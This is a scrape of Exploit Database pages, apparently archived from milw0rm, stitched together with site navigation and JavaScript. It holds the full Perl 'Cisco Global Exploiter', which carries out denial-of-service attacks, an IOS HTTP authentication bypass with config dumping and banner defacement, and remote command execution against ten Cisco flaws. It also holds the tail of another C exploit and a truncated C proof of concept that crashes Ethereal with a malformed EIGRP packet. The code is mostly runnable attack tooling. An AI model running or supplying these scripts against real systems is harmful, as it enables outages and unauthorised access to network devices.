listen port: %d. \n", port);do_sendudp_data (target);fprintf (stderr, "# done.\n");fprintf (stderr, "# make sure we are in, dude :)\n\n");return 0;}// milw0rm.com [2004-03-28]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 169
Cisco - Cisco Global er Tool - Hardware remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDCisco - Cisco Global er ToolEDB-ID:169CVE:N/AEDB Verified:Author:blackangelsType:remoteExploit:/Platform:HardwareDate:2004-03-28Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl###   Cisco Global Exploiter##   Legal notes :#   The BlackAngels staff refuse all responsabilities#   for an incorrect or illegal use of this software#   or for eventual damages to others systems.##   www blackangels it############### Modules ##############use Socket;use IO::Socket;########## Main ###########$host = "";$expvuln = "";$host = @ARGV[ 1 ];$expvuln = @ARGV[ 3 ];if ($host eq "") {usage();}if ($expvuln eq "") {usage();}if ($expvuln eq "1") {cisco1();}elsif ($expvuln eq "2") {cisco2();}elsif ($expvuln eq "3") {cisco3();}elsif ($expvuln eq "4") {cisco4();}elsif ($expvuln eq "5") {cisco5();}elsif ($expvuln eq "6") {cisco6();}elsif ($expvuln eq "7") {cisco7();}elsif ($expvuln eq "8") {cisco8();}elsif ($expvuln eq "9") {cisco9();}elsif ($expvuln eq "10") {cisco10();}else {printf "\nInvalid vulnerability number ...\n\n";exit(1);}############### Functions ################sub usage{printf "\nUsage :\n";printf "perl cge.pl -h <host> -v <vulnerability number>\n\n";printf "Vulnerabilities list :\n";printf "[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability\n";printf "[2] - Cisco IOS Router Denial of Service Vulnerability\n";printf "[3] - Cisco IOS HTTP Auth Vulnerability\n";printf "[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability\n";printf "[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability\n";printf "[6] - Cisco 675 Web Administration Denial of Service Vulnerability\n";printf "[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability\n";printf "[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability\n";printf "[9] - Cisco 514 UDP Flood Denial of Service Vulnerability\n";printf "[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability\n\n";exit(1);}sub cisco1              # Cisco 677/678 Telnet Buffer Overflow Vulnerability{my $serv = $host;my $dch = "?????????????????a~                %%%%%XX%%%%%";my $num = 30000;my $string .= $dch x $num;my $shc="\015\012";my $sockd = IO::Socket::INET->new (Proto    => "tcp",PeerAddr => $serv,PeerPort => "(23)",) || die("No telnet server detected on $serv ...\n\n");$sockd->autoflush(1);print $sockd "$string". $shc;while (<$sockd>){ print }print("\nPacket sent ...\n");sleep(1);print("Now checking server's status ...\n");sleep(2);my $sockd2 = IO::Socket::INET->new (Proto    => "tcp",PeerAddr => $serv,PeerPort => "(23)",) || die("Vulnerability successful exploited. Target server is down ...\n\n");print("Vulnerability unsuccessful exploited. Target server is still up ...\n\n");exit(1);}sub cisco2              # Cisco IOS Router Denial of Service Vulnerability{my $serv = $host;my $sockd = IO::Socket::INET->new (Proto=>"tcp",PeerAddr=>$serv,PeerPort=>"http(80)",);unless ($sockd){die "No http server detected on $serv ...\n\n"};$sockd->autoflush(1);print $sockd "GET /\%\% HTTP/1.0\n\n";-close $sockd;print "Packet sent ...\n";sleep(1);print("Now checking server's status ...\n");sleep(2);my $sockd2 = IO::Socket::INET->new (Proto=>"tcp",PeerAddr=>$serv,PeerPort=>"http(80)",);unless ($sockd2){die "Vulnerability successful exploited. Target server is down ...\n\n"};print("Vulnerability unsuccessful exploited. Target server is still up ...\n\n");exit(1);}sub cisco3              # Cisco IOS HTTP Auth Vulnerability{my $serv= $host;my $n=16;my $port=80;my $target = inet_aton($serv);my $fg = 0;LAB: while ($n<100) {my @results=exploit("GET /level/".$n."/exec/- HTTP/1.0\r\n\r\n");$n++;foreach $line (@results){$line=~ tr/A-Z/a-z/;if ($line =~ /http\/1\.0 401 unauthorized/) {$fg=1;}if ($line =~ /http\/1\.0 200 ok/) {$fg=0;}}if ($fg==1) {sleep(2);print "Vulnerability unsuccessful exploited ...\n\n\r";}else {sleep(2);print "Vulnerability successful exploited with [http://$serv/level/$n/exec/....] ...\n\n\r";last LAB;}sub exploit {my ($pstr)=@_;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||die("Unable to initialize socket ...\n\n");if(connect(S,pack "SnA4x8",2,$port,$target)){my @in;select(S);$|=1;print $pstr;while(<S>){ push @in, $_;}select(STDOUT); close(S); return @in;}else { die("No http server detected on $serv ...\n\n"); }}}exit(1);}sub cisco4              # Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability{my $serv = $host;my $n = 16;while ($n <100) {exploit1("GET /level/$n/exec/- HTTP/1.0\n\n");$wr =~ s/\n//g;if ($wr =~ /200 ok/) {while(1){ print "\nVulnerability could be successful exploited. Please choose a type of attack :\n";print "[1] Banner change\n";print "[2] List vty 0 4 acl info\n";print "[3] Other\n";print "Enter a valid option [ 1 - 2 - 3 ] : ";$vuln = <STDIN>;chomp($vuln);if ($vuln == 1) {print "\nEnter deface line : ";$vuln = <STDIN>;chomp($vuln);exploit1("GET /level/$n/exec/-/configure/-/banner/motd/$vuln HTTP/1.0\n\n");}elsif ($vuln == 2) {exploit1("GET /level/$n/exec/show%20conf HTTP/1.0\n\n");print "$wrf";}elsif ($vuln == 3){ print "\nEnter attack URL : ";$vuln = <STDIN>;chomp($vuln);exploit1("GET /$vuln HTTP/1.0\n\n");print "$wrf";}}}$wr = "";$n++;}die "Vulnerability unsuccessful exploited ...\n\n";sub exploit1 {my $sockd = IO::Socket::INET -> new (Proto    => 'tcp',PeerAddr => $serv,PeerPort  => 80,Type      => SOCK_STREAM,Timeout   => 5);unless($sockd){die "No http server detected on $serv ...\n\n"}$sockd->autoflush(1);$sockd -> send($_[0]);while(<$sockd>){$wr .= $_} $wrf = $wr;close $sockd;}exit(1);}sub cisco5              # Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability{my $serv = $host;my $port = 22;my $vuln = "a%a%a%a%a%a%a%";my $sockd = IO::Socket::INET->new (PeerAddr => $serv,PeerPort => $port,Proto    => "tcp")|| die "No ssh server detected on $serv ...\n\n";print "Packet sent ...\n";print $sockd "$vuln";close($sockd);exit(1);}sub cisco6              # Cisco 675 Web Administration Denial of Service Vulnerability{my $serv = $host;my $port = 80;my $vuln = "GET ? HTTP/1.0\n\n";my $sockd = IO::Socket::INET->new (PeerAddr => $serv,PeerPort => $port,Proto    => "tcp")|| die "No http server detected on $serv ...\n\n";print "Packet sent ...\n";print $sockd "$vuln";sleep(2);print "\nServer response :\n\n";close($sockd);exit(1);}sub cisco7              # Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability{my $serv = $host;my $port = 80;my $k = "";print "Enter a file to read [ /show/config/cr set as default ] : ";$k = <STDIN>;chomp ($k);if ($k eq ""){$vuln = "GET /exec/show/config/cr HTTP/1.0\n\n";}else{$vuln = "GET /exec$k HTTP/1.0\n\n";}my $sockd = IO::Socket::INET->new (PeerAddr => $serv,PeerPort => $port,Proto    => "tcp")|| die "No http server detected on $serv ...\n\n";print "Packet sent ...\n";print $sockd "$vuln";sleep(2);print "\nServer response :\n\n";while (<$sockd>){print}close($sockd);exit(1);}sub cisco8              # Cisco IOS Software HTTP Request Denial of Service Vulnerability{my $serv = $host;my $port = 80;my $vuln = "GET /error?/ HTTP/1.0\n\n";my $sockd = IO::Socket::INET->new (PeerAddr => $serv,PeerPort => $port,Proto    => "tcp")|| die "No http server detected on $serv ...\n\n";print "Packet sent ...\n";print $sockd "$vuln";sleep(2);print "\nServer response :\n\n";while (<$sockd>){print}close($sockd);exit(1);}sub cisco9              # Cisco 514 UDP Flood Denial of Service Vulnerability{my $ip = $host;my $port = "514";my $ports = "";my $size = "";my $i = "";print "Input packets size : ";$size = <STDIN>;chomp($size);socket(SS, PF_INET, SOCK_DGRAM, 17);my $iaddr = inet_aton("$ip");for ($i=0; $i<10000; $i++){send(SS, 0, $size, sockaddr_in($port, $iaddr));}printf "\nPackets sent ...\n";sleep(2);printf "Please enter a server's open port : ";$ports = <STDIN>;chomp $ports;printf "\nNow checking server status ...\n";sleep(2);socket(SO, PF_INET, SOCK_STREAM, getprotobyname('tcp')) || die "An error occuring while loading socket ...\n\n";my $dest = sockaddr_in ($ports, inet_aton($ip));connect (SO, $dest) || die "Vulnerability successful exploited. Target server is down ...\n\n";printf "Vulnerability unsuccessful exploited. Target server is still up ...\n\n";exit(1);}sub cisco10             # CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability{my $ip = $host;my $vln = "%%%%%XX%%%%%";my $num = 30000;my $string .= $vln x $num;my $shc="\015\012";my $sockd = IO::Socket::INET->new (Proto       => "tcp",PeerAddr    => $ip,PeerPort    => "(2002)",) || die "Unable to connect to $ip:2002 ...\n\n";$sockd->autoflush(1);print $sockd "$string" . $shc;while (<$sockd>){ print }print "Packet sent ...\n";close($sockd);sleep(1);print("Now checking server's status ...\n");sleep(2);my $sockd2 = IO::Socket::INET->new (Proto=>"tcp",PeerAddr=>$ip,PeerPort=>"(2002)",);unless ($sockd){die "Vulnerability successful exploited. Target server is down ...\n\n"};print("Vulnerability unsuccessful exploited. Target server is still up ...\n\n");exit(1);}# milw0rm.com [2004-03-28]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 170
Ethereal - EIGRP Dissector TLV_IP_INT Long IP Remote Denial of Service - Multiple dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDEthereal - EIGRP Dissector TLV_IP_INT Long IP Remote Denial of ServiceEDB-ID:170CVE:2004-0176EDB Verified:Author:Rémi Denis-CourmontType:dosExploit:/Platform:MultipleDate:2004-03-26Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Ethereal network protocol analyzer* EIGRP Dissector TLV_IP_INT Long IP Address Overflow* vulnerability* proof of concept code* version 1.0 (Mar 26 2004)** by R&#65533;mi Denis-Courmont < ethereal at simphalampin dot com >*   www simphalempin com dev** This vulnerability was found by:*   Stefan Esser s.esser e-matters de* whose original advisory may be fetched from:*   security e-matters de advisories 032004.html** Vulnerable:*  - Ethereal v0.10.2** Not vulnerable:*  - Ethreal v0.10.3** Note: this code will simply trigger a denial of service on Ethereal.* It should really be possible to exploit the buffer overflow* (apparently up to 29 bytes overflow), but I haven't tried.*/#include <string.h>#include <stdio.h>#include <sys/types.h>#include <unistd.h>#include <sys/socket.h>#include <netinet/ip.h>#include <netdb.h>static const char packet[] ="\x01" /* Version */"\x04" /* Opcode: Reply */"\x00\x00" /* Checksum (invalid) */"\x00\x00\x00\x00" /* Flags */"\x00\x00\x00\x00" /* Sequence number */"\x00\x00\x00\x00" /* ACK */"\x00\x00\x00\x00" /* AS number *//* IP internal routes TLV */"\x01\x02" /* Type */"\x00\x39" /* Length (should be 0x1C) */"\x00\x00\x00\x00" /* Next hop */"\x00\x00\x00\x00" /* Delay */"\x00\x00\x00\x00" /* Bandwitdh */"\x00\x00\x00" /* MTU */"\x00" /* Hop count: directly connected */"\xff" /* Reliability: maximum */"\x01" /* Load: minimum */"\x00\x00" /* Reserved */"\xff" /* Prefix length: should be > 0 and <= 32 */"\x00\x00\x00" /* Destination network */"\xff\xff\xff\xff" "\xff\xff\xff\xff""\xff\xff\xff\xff" "\xff\xff\xff\xff""\xff\xff\xff\xff" "\xff\xff\xff\xff""\xff\xff\xff\xff" "\xff" /* buffer overflow */;static intproof (const struct sockaddr_in *dest){int fd;size_t len;fd = socket (PF_INET, SOCK_RAW, 88);if (fd == -1){perror ("Raw socket error");return 1;}len = sizeof (packet) - 1;if (sendto (fd, packet, len, 0, (const struct sockaddr *)dest,sizeof (struct sockaddr_in)) != len){perror ("Packet sending error");close (fd);return 1;}puts ("Packet sent!");close (fd);return 0;}static intusage (const char *path){fprintf (stderr, "Usage: %s <hostname/IP>\n", path);return 2;}intmain (int argc, char *argv[]){struct sockaddr *dest;puts ("Ethereal EIGRP Dissector TLV_IP_INT Long IP Address Overflow\n""proof of concept code\n""Copyright (C) 2004 R<E9>mi Denis-Courmont ""<\x65\x74\x68\x65\x72\x65\x61\x6c\x40\x73\x69\x6d\x70""\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n");if (argc != 2)return usage (argv[0]);else{struct addrinfo help, *res;int check;memset (&help, 0, sizeof (help));help.ai_family = PF_INET;check = getaddrinfo (argv[1], NULL, &help, &res);if (check){fprintf (stderr, "%s: %s\n", argv[1],gai_strerror (check));return 1;}dest = res->ai_addr;}return proof ((const struct sockaddr_in 